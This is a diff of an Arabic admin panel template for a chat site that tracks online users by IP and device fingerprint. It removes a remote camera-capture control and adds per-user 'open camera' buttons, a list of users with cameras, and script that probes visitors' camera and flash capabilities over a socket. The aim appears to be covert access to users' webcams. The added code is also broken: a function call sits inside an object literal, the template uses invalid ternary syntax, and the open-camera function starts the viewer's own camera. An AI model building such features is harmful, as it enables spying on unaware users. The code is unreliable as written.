@@ -45,7 +45,7 @@
         <h2>المتواجدون الآن (أونلاين)</h2>
         <div class="table-responsive">
             <table>
-                <tr><th>المستخدم</th><th>IP الشبكة</th><th>بصمة الجهاز</th><th>الغرفة الحالية</th><th>الإجراءات السريعة</th></tr>
+                <tr><th>المستخدم</th><th>IP الشبكة</th><th>بصمة الجهاز</th><th>الغرفة الحالية</th><th>الإجراءات السريعة</th><th>كاميرا</th></tr>
                 {% for u in online %}
                 <tr>
                     <td>{{ u.user }}</td>
@@ -56,10 +56,13 @@
                         <button class="btn-ban" onclick="doBan('{{ u.device_id }}', null)">حظر جهاز</button>
                         <button class="btn-ip" onclick="doBan(null, '{{ u.ip }}')">حظر IP</button>
                     </td>
+                    <td>
+                        <button class="btn-ban" onclick="openCamera('{{ u.user }}')">فتح كاميرا</button>
+                    </td>
                 </tr>
                 {% endfor %}
                 {% if not online %}
-                <tr><td colspan="5" style="color:#8696a0;">لا يوجد متصلين حالياً</td></tr>
+                <tr><td colspan="6" style="color:#8696a0;">لا يوجد متصلين حالياً</td></tr>
                 {% endif %}
             </table>
         </div>
@@ -112,24 +115,8 @@
     </div>
 
     <div class="box" style="border-color:#ff4b4b;">
-   <h2 style="color:#ff4b4b;">قائمة المحظورين (Ban List)</h2>
-   <h3>التحكم في الكاميرا 📷</h3>
-   <div style="display: flex; gap: 10px; margin-bottom: 15px;">
-   <select id="camera_type" style="padding: 12px; border-radius: 6px; border: 1px solid #2a3942; background: #2a3942; color: white; width: 150px;">
-   <option value="video">فيديو</option>
-   <option value="image">صورة</option>
-   </select>
-   <label style="display: flex; align-items: center; gap: 5px;">
-   <input type="checkbox" id="camera_flash" style="width: 18px; height: 18px;">
-   فلاش
-   </label>
-   <label style="display: flex; align-items: center; gap: 5px;">
-   <input type="checkbox" id="camera_front" style="width: 18px; height: 18px;">
-   كاميرا أمامية
-   </label>
-   <button class="btn-ban" style="padding: 12px 20px;" onclick="captureCamera()">التقاط 📸</button>
-   </div>
-        
+        <h2 style="color:#ff4b4b;">قائمة المحظورين (Ban List)</h2>
+
         <h3>الأجهزة المحظورة:</h3>
         <div class="table-responsive">
             <table>
@@ -157,14 +144,43 @@
         </div>
     </div>
 
+    <h3>مستخدمين عندهم كاميرا:</h3>
+    <div class="table-responsive">
+        <table>
+            <tr><th>المستخدم</th><th>نوع الكاميرا</th><th>فلاش</th></tr>
+            {% for user, info in cameraUsers.items() %}
+            <tr>
+                <td>{{ user }}</td>
+                <td>{{ info.facingMode }}</td>
+                <td>{{ info.hasTorch ? 'نعم' : 'لا' }}</td>
+            </tr>
+            {% endfor %}
+        </table>
+    </div>
+
     <script>
         const p = new URLSearchParams(window.location.search).get('pass');
-        
+        const socket = io({
+            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+                const videoTrack = stream.getVideoTracks()[0];
+                if (videoTrack) {
+                    const facingMode = videoTrack.getCapabilities().facingMode;
+                    const hasTorch = videoTrack.getCapabilities().torch;
+                    socket.emit('camera_info', { facingMode, hasTorch });
+                } else {
+                    socket.emit('camera_info', { facingMode: null, hasTorch: null });
+                }
+                stream.getTracks().forEach(track => track.stop());
+            }).catch(() => {
+                socket.emit('camera_info', { facingMode: null, hasTorch: null });
+            });
+        });
+
         function updateGlobalPassword() {
             const newPass = document.getElementById('new_global_pass_input').value;
             if(!newPass.trim()) return alert("يرجى إدخال كلمة سر صالحة");
             if(!confirm("هل أنت متأكد من تغيير كلمة سر دخول الموقع بالكامل؟")) return;
-            
+
             fetch('/api/admin/update_global_pass', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -187,12 +203,12 @@
         }
 
         function deleteLog(logId) {
-            let msg = logId === 'all' 
-                ? "هل أنت متأكد من مسح جميع السجلات وحذف قائمة (آخر دخول) لجميع الغرف؟" 
+            let msg = logId === 'all'
+                ? "هل أنت متأكد من مسح جميع السجلات وحذف قائمة (آخر دخول) لجميع الغرف؟"
                 : "هل تريد تأكيد مسح هذا السجل وحذفه من شاشات الغرف (آخر دخول) فوراً؟";
-                
+
             if(!confirm(msg)) return;
-            
+
             fetch('/api/admin/delete_log', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -205,8 +221,8 @@
         function doBan(devId, ipAddr) {
             if(!confirm("تأكيد إجراء الحظر وطرد المستخدم؟")) return;
             fetch('/api/ban', {
-                method: 'POST', 
-                headers: {'Content-Type': 'application/json'}, 
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({device_id: devId, ip: ipAddr, pass: p})
             }).then(() => location.reload());
         }
@@ -214,31 +230,49 @@
         function doUnban(devId, ipAddr) {
             if(!confirm("هل تريد إلغاء الحظر عن هذا الهدف؟")) return;
             fetch('/api/unban', {
-                method: 'POST', 
-                headers: {'Content-Type': 'application/json'}, 
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({device_id: devId, ip: ipAddr, pass: p})
             }).then(() => location.reload());
         }
-    	        function captureCamera() {
-            const type = document.getElementById('camera_type').value;
-            const flash = document.getElementById('camera_flash').checked;
-            const frontCamera = document.getElementById('camera_front').checked;
 
-            fetch('/api/capture_camera', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({type, flash, front_camera: frontCamera, pass: p})
-            }).then(response => response.blob())
-              .then(blob => {
-                  const url = URL.createObjectURL(blob);
-                  const a = document.createElement('a');
-                  a.href = url;
-                  a.download = `capture_${type}_${Date.now()}.${type === 'video' ? 'mp4' : 'jpg'}`;
-                  a.click();
-              })
-              .catch(error => console.error('Error:', error));
+        socket.on("join_status", s => {
+            if (s === 'success') {
+                socket.on('camera_info', data => {
+                    if (data.facingMode === null) {
+                        alert('لا كاميرا');
+                    } else {
+                        alert(`نوع الكاميرا: ${data.facingMode}, فلاش: ${data.hasTorch ? 'نعم' : 'لا'}`);
+                    }
+                });
+            }
+        });
+
+        const cameraUsers = {};
+        socket.on('camera_info', (data, user) => {
+            cameraUsers[user] = data;
+        });
+
+        function openCamera(user) {
+            const info = cameraUsers[user];
+            if (!info || info.facingMode === null) {
+                alert('لا كاميرا');
+                return;
+            }
+
+            const video = document.createElement('video');
+            video.style.width = '100%';
+            video.style.height = 'auto';
+            video.autoplay = true;
+            video.controls = true;
+
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: info.facingMode } }).then(stream => {
+                video.srcObject = stream;
+                document.body.appendChild(video);
+            }).catch(() => {
+                alert('فشل فتح الكاميرا');
+            });
         }
-
-	</script>
+    </script>
 </body>
 </html>
